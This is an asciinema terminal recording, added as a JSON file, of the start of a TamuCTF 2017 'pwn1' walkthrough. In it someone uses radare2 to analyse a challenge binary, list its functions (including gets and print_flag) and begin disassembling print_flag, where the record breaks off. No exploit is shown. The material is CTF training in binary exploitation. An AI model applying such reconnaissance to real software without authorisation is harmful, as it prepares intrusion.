@@ -1,0 +1,2526 @@
+{
+  "title": "TamuCTF2017 - pwn1",
+  "env": {
+    "TERM": "xterm",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.061732,
+      "\u001b]0;root@kali: ~/CTFs/TamuCtf2017/pwn1\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/CTFs/TamuCtf2017/pwn1\u001b[00m# "
+    ],
+    [
+      0.5,
+      "#"
+    ],
+    [
+      0.155607,
+      " "
+    ],
+    [
+      0.270186,
+      "F"
+    ],
+    [
+      0.179916,
+      "i"
+    ],
+    [
+      0.092953,
+      "r"
+    ],
+    [
+      0.15373,
+      "s"
+    ],
+    [
+      0.126641,
+      "t"
+    ],
+    [
+      0.067827,
+      " "
+    ],
+    [
+      0.206418,
+      "w"
+    ],
+    [
+      0.070183,
+      "e"
+    ],
+    [
+      0.453009,
+      " "
+    ],
+    [
+      0.20613,
+      "o"
+    ],
+    [
+      0.076847,
+      "p"
+    ],
+    [
+      0.148044,
+      "e"
+    ],
+    [
+      0.062173,
+      "n"
+    ],
+    [
+      0.212123,
+      " "
+    ],
+    [
+      0.5,
+      "t"
+    ],
+    [
+      0.101943,
+      "h"
+    ],
+    [
+      0.113975,
+      "e"
+    ],
+    [
+      0.075159,
+      " "
+    ],
+    [
+      0.3603,
+      "b"
+    ],
+    [
+      0.08001,
+      "i"
+    ],
+    [
+      0.116035,
+      "n"
+    ],
+    [
+      0.162884,
+      "a"
+    ],
+    [
+      0.101125,
+      "r"
+    ],
+    [
+      0.046009,
+      "y"
+    ],
+    [
+      0.155115,
+      " "
+    ],
+    [
+      0.101985,
+      "w"
+    ],
+    [
+      0.08415,
+      "i"
+    ],
+    [
+      0.116916,
+      "t"
+    ],
+    [
+      0.063097,
+      "h"
+    ],
+    [
+      0.091333,
+      " "
+    ],
+    [
+      0.5,
+      "r"
+    ],
+    [
+      0.105026,
+      "a"
+    ],
+    [
+      0.148954,
+      "d"
+    ],
+    [
+      0.112719,
+      "a"
+    ],
+    [
+      0.126377,
+      "r"
+    ],
+    [
+      0.100088,
+      "e"
+    ],
+    [
+      0.207123,
+      "2"
+    ],
+    [
+      0.406559,
+      "\r\n\u001b]0;root@kali: ~/CTFs/TamuCtf2017/pwn1\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/CTFs/TamuCtf2017/pwn1\u001b[00m# "
+    ],
+    [
+      0.5,
+      "r"
+    ],
+    [
+      0.069692,
+      "2"
+    ],
+    [
+      0.049062,
+      " "
+    ],
+    [
+      0.5,
+      "p"
+    ],
+    [
+      0.08895,
+      "w"
+    ],
+    [
+      0.081021,
+      "n"
+    ],
+    [
+      0.113968,
+      "1"
+    ],
+    [
+      0.5,
+      "\r\n"
+    ],
+    [
+      0.036587,
+      " -- ESIL: The Aftersleep"
+    ],
+    [
+      5.6e-05,
+      "\r\n"
+    ],
+    [
+      0.000119,
+      "\u001b[0K\r"
+    ],
+    [
+      6.6e-05,
+      "\u001b[0K\r\u001b[33m[0x08048450]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r"
+    ],
+    [
+      0.000102,
+      "\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m #\r\u001b[33m[0x08048450]>\u001b[0m #"
+    ],
+    [
+      0.097499,
+      "\u001b[0K\r"
+    ],
+    [
+      6e-05,
+      "\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # \r\u001b[33m[0x08048450]>\u001b[0m # "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r"
+    ],
+    [
+      6.6e-05,
+      "\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # L\r\u001b[33m[0x08048450]>\u001b[0m # L"
+    ],
+    [
+      0.176856,
+      "\u001b[0K\r"
+    ],
+    [
+      6.3e-05,
+      "\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Le\r\u001b[33m[0x08048450]>\u001b[0m # Le"
+    ],
+    [
+      0.123017,
+      "\u001b[0K\r"
+    ],
+    [
+      6.2e-05,
+      "\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Let\r\u001b[33m[0x08048450]>\u001b[0m # Let"
+    ],
+    [
+      0.135031,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets\r\u001b[33m[0x08048450]>\u001b[0m # Lets"
+    ],
+    [
+      0.252164,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets \r\u001b[33m[0x08048450]>\u001b[0m # Lets "
+    ],
+    [
+      0.213012,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets a\r\u001b[33m[0x08048450]>\u001b[0m # Lets a"
+    ],
+    [
+      0.148062,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets an\r\u001b[33m[0x08048450]>\u001b[0m # Lets an"
+    ],
+    [
+      0.108017,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets ana\r\u001b[33m[0x08048450]>\u001b[0m # Lets ana"
+    ],
+    [
+      0.129171,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets anal\r\u001b[33m[0x08048450]>\u001b[0m # Lets anal"
+    ],
+    [
+      0.195091,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analy\r\u001b[33m[0x08048450]>\u001b[0m # Lets analy"
+    ],
+    [
+      0.101944,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyz\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyz"
+    ],
+    [
+      0.201408,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze"
+    ],
+    [
+      0.102997,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze \r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze "
+    ],
+    [
+      0.207155,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze t\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze t"
+    ],
+    [
+      0.12481,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze th\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze th"
+    ],
+    [
+      0.062021,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the"
+    ],
+    [
+      0.12304,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the \r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the "
+    ],
+    [
+      0.31527,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the b\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the b"
+    ],
+    [
+      0.130937,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the bi\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the bi"
+    ],
+    [
+      0.071101,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the bin\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the bin"
+    ],
+    [
+      0.144214,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the bina\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the bina"
+    ],
+    [
+      0.085883,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binar\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binar"
+    ],
+    [
+      0.067086,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary"
+    ],
+    [
+      0.166022,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary \r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary t\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary t"
+    ],
+    [
+      0.082947,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to"
+    ],
+    [
+      0.177982,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to \r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to "
+    ],
+    [
+      0.254179,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to d\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to d"
+    ],
+    [
+      0.102925,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to di\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to di"
+    ],
+    [
+      0.190153,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to dis\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to dis"
+    ],
+    [
+      0.270229,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to disc\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to disc"
+    ],
+    [
+      0.106986,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to disco\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to disco"
+    ],
+    [
+      0.173115,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discov\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discov"
+    ],
+    [
+      0.142091,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discove\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discove"
+    ],
+    [
+      0.240206,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover \r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover i\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover i"
+    ],
+    [
+      0.079692,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover it\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover it"
+    ],
+    [
+      0.066034,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its"
+    ],
+    [
+      0.051906,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its \r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its "
+    ],
+    [
+      0.257366,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its f\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its f"
+    ],
+    [
+      0.101971,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its fu\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its fu"
+    ],
+    [
+      0.058952,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its fun\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its fun"
+    ],
+    [
+      0.055162,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its func\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its func"
+    ],
+    [
+      0.20918,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its funct\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its funct"
+    ],
+    [
+      0.056843,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its functi\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its functi"
+    ],
+    [
+      0.049057,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its functio\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its functio"
+    ],
+    [
+      0.036963,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its function\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its function"
+    ],
+    [
+      0.099071,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its functions\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its functions"
+    ],
+    [
+      0.146925,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lets analyze the binary to discover its functions\r\n\u001b[0K\r"
+    ],
+    [
+      2.5e-05,
+      "\u001b[0K\r\u001b[33m[0x08048450]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m a\r\u001b[33m[0x08048450]>\u001b[0m a"
+    ],
+    [
+      0.16709,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m aa\r\u001b[33m[0x08048450]>\u001b[0m aa"
+    ],
+    [
+      0.1531,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m aaa\r\u001b[33m[0x08048450]>\u001b[0m aaa"
+    ],
+    [
+      0.134754,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m aaa\r\n[ ] \u001b[33mAnalyze all flags starting with sym. and entry0 (aa)\r[\u001b[0m"
+    ],
+    [
+      0.007938,
+      "\r\u001b[32m[x]\u001b[0m Analyze all flags starting with sym. and entry0 (aa)"
+    ],
+    [
+      5e-05,
+      "\r\n"
+    ],
+    [
+      5.2e-05,
+      "\u001b[0K\r"
+    ],
+    [
+      0.000102,
+      "[ ] \u001b[33mAnalyze len bytes of instructions for references (aar)\r[\u001b[0m"
+    ],
+    [
+      0.002454,
+      "\r\u001b[32m[x]\u001b[0m Analyze len bytes of instructions for references (aar)"
+    ],
+    [
+      4.8e-05,
+      "\r\n"
+    ],
+    [
+      7.9e-05,
+      "[ ] \u001b[33mAnalyze function calls (aac)\r[\u001b[0m"
+    ],
+    [
+      0.00932,
+      "\r\u001b[32m[x]\u001b[0m Analyze function calls (aac)"
+    ],
+    [
+      4.9e-05,
+      "\r\n"
+    ],
+    [
+      5.1e-05,
+      "[ ] \u001b[33m[*] Use -AA or aaaa to perform additional experimental analysis."
+    ],
+    [
+      6.9e-05,
+      "\r\n"
+    ],
+    [
+      4.7e-05,
+      "\r[\u001b[0m"
+    ],
+    [
+      5.3e-05,
+      "[ ] \u001b[33mConstructing a function name for fcn.* and sym.func.* functions (aan)\r[\u001b[0m"
+    ],
+    [
+      0.000104,
+      "\r\u001b[32m[x]\u001b[0m Constructing a function name for fcn.* and sym.func.* functions (aan)"
+    ],
+    [
+      4.5e-05,
+      "\r\n"
+    ],
+    [
+      0.000105,
+      "\u001b[0K\r"
+    ],
+    [
+      5e-05,
+      "\u001b[0K\r\u001b[33m[0x08048450]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r"
+    ],
+    [
+      0.000232,
+      "\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m #\r\u001b[33m[0x08048450]>\u001b[0m #"
+    ],
+    [
+      0.201725,
+      "\u001b[0K\r"
+    ],
+    [
+      6.2e-05,
+      "\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # \r\u001b[33m[0x08048450]>\u001b[0m # "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r"
+    ],
+    [
+      6.3e-05,
+      "\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # L\r\u001b[33m[0x08048450]>\u001b[0m # L"
+    ],
+    [
+      0.161855,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Li\r\u001b[33m[0x08048450]>\u001b[0m # Li"
+    ],
+    [
+      0.131011,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Lis\r\u001b[33m[0x08048450]>\u001b[0m # Lis"
+    ],
+    [
+      0.091261,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # List\r\u001b[33m[0x08048450]>\u001b[0m # List"
+    ],
+    [
+      0.130838,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listi\r\u001b[33m[0x08048450]>\u001b[0m # Listi"
+    ],
+    [
+      0.076076,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listin\r\u001b[33m[0x08048450]>\u001b[0m # Listin"
+    ],
+    [
+      0.069023,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing\r\u001b[33m[0x08048450]>\u001b[0m # Listing"
+    ],
+    [
+      0.140048,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing \r\u001b[33m[0x08048450]>\u001b[0m # Listing "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing f\r\u001b[33m[0x08048450]>\u001b[0m # Listing f"
+    ],
+    [
+      0.063248,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing fu\r\u001b[33m[0x08048450]>\u001b[0m # Listing fu"
+    ],
+    [
+      0.067648,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing fun\r\u001b[33m[0x08048450]>\u001b[0m # Listing fun"
+    ],
+    [
+      0.095969,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing func\r\u001b[33m[0x08048450]>\u001b[0m # Listing func"
+    ],
+    [
+      0.24722,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing funct\r\u001b[33m[0x08048450]>\u001b[0m # Listing funct"
+    ],
+    [
+      0.017874,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing functi\r\u001b[33m[0x08048450]>\u001b[0m # Listing functi"
+    ],
+    [
+      0.068145,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing functio\r\u001b[33m[0x08048450]>\u001b[0m # Listing functio"
+    ],
+    [
+      0.042025,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing function\r\u001b[33m[0x08048450]>\u001b[0m # Listing function"
+    ],
+    [
+      0.112988,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing functions\r\u001b[33m[0x08048450]>\u001b[0m # Listing functions"
+    ],
+    [
+      0.15901,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m # Listing functions\r\n\u001b[0K\r"
+    ],
+    [
+      5e-05,
+      "\u001b[0K\r\u001b[33m[0x08048450]>\u001b[0m "
+    ],
+    [
+      0.372474,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m a\r\u001b[33m[0x08048450]>\u001b[0m a"
+    ],
+    [
+      0.068848,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m af\r\u001b[33m[0x08048450]>\u001b[0m af"
+    ],
+    [
+      0.102998,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m afl\r\u001b[33m[0x08048450]>\u001b[0m afl"
+    ],
+    [
+      0.08707,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m afl\r\n0x08048390    3 35           sym._init"
+    ],
+    [
+      3.2e-05,
+      "\r\n"
+    ],
+    [
+      3.1e-05,
+      "0x080483d0    1 6            sym.imp.gets"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "0x080483e0    1 6            sym.imp._IO_getc"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "0x080483f0    1 6            sym.imp.puts"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      3.2e-05,
+      "0x08048400    1 6            sym.imp.__libc_start_main"
+    ],
+    [
+      5.8e-05,
+      "\r\n0x08048410    1 6            sym.imp.setvbuf"
+    ],
+    [
+      5.9e-05,
+      "\r\n0x08048420    1 6            sym.imp.fopen\r\n0x08048430    1 6            sym.imp.putchar\r\n0x08048440    1 6            sub.__gmon_start___252_440\r\n0x08048450    1 33           entry0\r\n0x08048480    1 4            sym.__x86.get_pc_thunk.bx\r\n0x08048490    4 43           sym.deregister_tm_clones\r\n0x080484c0    4 53           sym.register_tm_clones\r\n0x08048500    3 30           sym.__do_global_dtors_aux\r\n0x08048520    4 43   -> 40   sym.frame_dummy\r\n0x0804854b    4 103          sym.print_flag\r\n"
+    ],
+    [
+      3.4e-05,
+      "0x080485b2    4 120          main\r\n0x08048630    4 93           sym.__libc_csu_init\r\n0x08048690    1 2            sym.__libc_csu_fini\r\n0x08048694    1 20           sym._fini\r\n\u001b[0K\r"
+    ],
+    [
+      1.9e-05,
+      "\u001b[0K\r\u001b[33m[0x08048450]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s\r\u001b[33m[0x08048450]>\u001b[0m s"
+    ],
+    [
+      0.100961,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s \r\u001b[33m[0x08048450]>\u001b[0m s "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s p\r\u001b[33m[0x08048450]>\u001b[0m s p"
+    ],
+    [
+      0.058937,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s pr\r\u001b[33m[0x08048450]>\u001b[0m s pr"
+    ],
+    [
+      0.228365,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s pri\r\u001b[33m[0x08048450]>\u001b[0m s pri"
+    ],
+    [
+      0.081794,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s prin\r\u001b[33m[0x08048450]>\u001b[0m s prin"
+    ],
+    [
+      0.053112,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s print\r\u001b[33m[0x08048450]>\u001b[0m s print"
+    ],
+    [
+      0.214351,
+      "\u001b[0K\r\r\u001b[2K\r"
+    ],
+    [
+      3.9e-05,
+      "\r\u001b[33m[0x08048450]>\u001b[0m s print\r\u001b[33m[0x08048450]>\u001b[0m s print"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s prin\r\u001b[33m[0x08048450]>\u001b[0m s prin"
+    ],
+    [
+      0.169923,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s pri\r\u001b[33m[0x08048450]>\u001b[0m s pri"
+    ],
+    [
+      0.151072,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s pr\r\u001b[33m[0x08048450]>\u001b[0m s pr"
+    ],
+    [
+      0.151181,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s p\r\u001b[33m[0x08048450]>\u001b[0m s p"
+    ],
+    [
+      0.153906,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s \r\u001b[33m[0x08048450]>\u001b[0m s "
+    ],
+    [
+      0.270369,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s s\r\u001b[33m[0x08048450]>\u001b[0m s s"
+    ],
+    [
+      0.276947,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s sy\r\u001b[33m[0x08048450]>\u001b[0m s sy"
+    ],
+    [
+      0.096043,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s sym\r\u001b[33m[0x08048450]>\u001b[0m s sym"
+    ],
+    [
+      0.032948,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s sym.\r\u001b[33m[0x08048450]>\u001b[0m s sym."
+    ],
+    [
+      0.269467,
+      "\u001b[0K\r\r\u001b[2K\r\u001b[33m[0x08048450]>\u001b[0m s sym."
+    ],
+    [
+      0.000134,
+      "\r\nsym.deregister_tm_clones    sym.register_tm_clones      sym.__do_global_dtors_aux   \r\nsym.frame_dummy             sym.__libc_csu_fini         sym.__x86.get_pc_thunk.bx   \r\nsym._fini                   sym.__libc_csu_init         sym._start                  "
+    ],
+    [
+      6.5e-05,
+      "\r\nsym.main                    sym.print_flag              sym._init                   \r\nsym.imp.gets                sym.imp._IO_getc            sym.imp.puts                \r\nsym.imp.__libc_start_main   sym.imp.setvbuf             sym.imp.fopen               "
+    ],
+    [
+      3e-05,
+      "\r\nsym.imp.putchar             \r\n\r\u001b[33m[0x08048450]>\u001b[0m s sym.\r\u001b[33m[0x08048450]>\u001b[0m s sym."
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s sym.p\r\u001b[33m[0x08048450]>\u001b[0m s sym.p"
+    ],
+    [
+      0.096838,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s sym.pr\r\u001b[33m[0x08048450]>\u001b[0m s sym.pr"
+    ],
+    [
+      0.10826,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s sym.pri\r\u001b[33m[0x08048450]>\u001b[0m s sym.pri"
+    ],
+    [
+      0.075001,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s sym.prin\r\u001b[33m[0x08048450]>\u001b[0m s sym.prin"
+    ],
+    [
+      0.085008,
+      "\u001b[0K\r\r\u001b[2K\r"
+    ],
+    [
+      3.6e-05,
+      "\r\u001b[33m[0x08048450]>\u001b[0m s sym.print_flag \r\u001b[33m[0x08048450]>\u001b[0m s sym.print_flag "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x08048450]>\u001b[0m s sym.print_flag \r\n\u001b[0K\r"
+    ],
+    [
+      4.3e-05,
+      "\u001b[0K\r\u001b[33m[0x0804854b]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m p\r\u001b[33m[0x0804854b]>\u001b[0m p"
+    ],
+    [
+      0.048878,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m pd\r\u001b[33m[0x0804854b]>\u001b[0m pd"
+    ],
+    [
+      0.072823,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m pdf\r\u001b[33m[0x0804854b]>\u001b[0m pdf"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m pdf\r\n"
+    ],
+    [
+      0.001515,
+      "\u001b[36m/ \u001b[0m\u001b[31m(fcn) sym.print_flag\u001b[0m 103"
+    ],
